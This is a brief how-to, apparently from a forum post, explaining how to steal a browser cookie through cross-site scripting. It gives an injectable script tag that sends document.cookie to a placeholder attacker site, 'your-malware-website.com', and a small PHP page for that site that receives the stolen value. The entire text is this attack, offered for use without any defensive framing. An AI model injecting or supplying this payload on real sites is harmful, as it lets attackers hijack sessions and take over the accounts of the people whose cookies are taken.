For example, this is a simple way to steal a cookie:

Inject this code:

<script>window.open('http://www.your-malware-website.com/givemecook.php?cook='%2Bdocument.cookie);</script>


And on "your-malware-website" put this page:

givemecook.php:
<?
echo $HTTP_COOKIE_VARS["cook"];
?>

and so, the cookie will be logged in "your-malware-website"
